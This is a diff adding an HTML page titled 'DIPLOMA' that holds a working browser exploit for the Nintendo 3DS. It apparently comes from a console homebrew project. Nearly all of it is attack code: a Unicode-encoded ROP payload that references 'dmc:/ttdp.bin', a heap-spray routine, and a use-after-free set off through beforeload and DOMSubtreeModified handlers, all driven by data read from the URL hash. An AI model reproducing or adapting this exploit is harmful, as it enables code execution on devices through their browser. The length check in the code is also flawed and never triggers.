@@ -1,0 +1,116 @@
+<html>
+<head>
+<style> 
+    body { color: white;  background: black; } iframe { display: none; } h1 { text-align: center; }
+</style>
+<script>
+    var nb = 0;
+    var data;
+var payload = 
+    '\uc2fc\u0010\u50b3\u0010\uca34\u0019\ubeef\udead\ubeef\udead\ubeef\udead\u46eb\u0019\u0000\u08f1'
++   '\u8534\u08b8\u0001\u0000\ubeef\udead\ubeef\udead\ubeef\udead\ufe0c\u0022\ubeef\udead\ubeef\udead'
++   '\ubeef\udead\ubeef\udead\u57c4\u0010\u46eb\u0019\u0000\u08f1\u0020\u08f1\u0000\u1841\u4000\u0000'
++   '\ubeef\udead\ubeef\udead\u86e0\u0016\ubeef\udead\ubeef\udead\ubeef\udead\ubeef\udead\ubeef\udead'
++   '\ubeef\udead\ub5b4\u0010\ua72c\u003d\u8001\uffff\u0000\u1841\u4000\u0000\uc0de\udead\u035c\u0013'
++   '\u57c4\u0010\uc1e0\u0012\uc2fc\u0010\u7c98\u003d\u8af4\u0022\u84fc\u08b8\u035c\u0013\u57c4\u0010'
++   '\ubf04\u0012\uc2fc\u0010\uca00\u3b9a\u8af4\u0022\u0000\u0000\u035c\u0013\u57c4\u0010\u41f8\u0010'
++   '\ub5b4\u0010\u0000\u1841\u8400\u08b8\u0300\u0000\uc0de\udead\u848c\u08b8\u0b54\u0024\u0004\u0000'
++   '\u0000\u1841\u2000\u1959\u4000\u0000\uffff\uffff\uffff\uffff\u0008\u0000\u2000\u009d\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u8400\u08b8\u0000\u0000\u57c4\u0010\u0064\u006d\u0063\u003a\u002f\u0074'
++   '\u0074\u0064\u0070\u002e\u0062\u0069\u006e\u0000\u0000\u0000\u0000\u0000\uc2fc\u0010\u8618\u08b8'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0344\u0013'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'
++   '\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000';
+
+    if(parent==window) {
+        window.onload = function() {
+            
+            var hashstring = window.location.hash.substring(1);
+
+            if(hashstring.length == 0) {
+                document.body.innerHTML += "<h1>NOTHING TO DO HERE</h1>";
+                return;
+            }
+            
+            try {
+                data = atob(hashstring);
+            } catch(e) {
+                document.body.innerHTML += "<h1>INVALID DATA FORMAT</h1>";
+                return;
+            }
+
+            if(data.length < 3 && data.length > 14) {
+                document.body.innerHTML += "<h1>INVALID DATA SIZE</h1>";
+                return;
+            }
+
+            species = String.fromCharCode((data.charCodeAt(0) & 0xFF) + (data.charCodeAt(1) << 8));
+
+            var arr = [];
+            for(i = 0, j = 2; i < data.length / 2 - 1; j += 2)
+                arr[i++] = ( data.charCodeAt(j) & 255 ) + ( data.charCodeAt(j + 1) << 8 );
+            data = String.fromCharCode.apply(null, arr);
+
+            while(data.length < 12)
+                data += "\u0000";
+    
+            payload = [ payload.substring(  0, 268), "\u0006", species,
+                        payload.substring(270, 272), data,
+                        payload.substring(284, 384)].join("");
+
+            document.body.innerHTML += "<h1>RUNNING EXPLOIT</h1>";
+            document.body.innerHTML += "<iframe src='#' />";
+        }
+    } else if(navigator.userAgent.indexOf('Nintendo 3DS') != -1) {
+
+        window.onload = documentLoaded;
+    }
+
+    function magicfun(mem, size, v) {
+        var a = new Array(size - 20);
+        nv = v + unescape("%ucccc");
+        for (var j = 0; j < a.length / (v.length / 4); j++) a[j] = nv;
+        var t = document.createTextNode(String.fromCharCode.apply(null, new Array(a)));
+
+        mem.push(t);
+    }
+
+    function dsm(e) {
+        var mem = [];
+        for (var j = 20; j < 430; j++) {
+            magicfun(mem, j, unescape(payload));
+        }
+    }
+
+    function handleBeforeLoad() {
+        if (++nb == 1) {
+            p.addEventListener('DOMSubtreeModified', parent.dsm, false);
+        } else if (nb == 2) {
+            p.removeChild(f);
+        }
+    }
+
+    function documentLoaded() {
+        f = window.frameElement;
+        p = f.parentNode;
+        var o = document.createElement("object");
+        o.addEventListener('beforeload', handleBeforeLoad, false);
+        document.body.appendChild(o);
+    }
+
+</script>
+</head>
+<body>
+    <h1 align="center">DIPLOMA</h1>
+</body>
+</html>
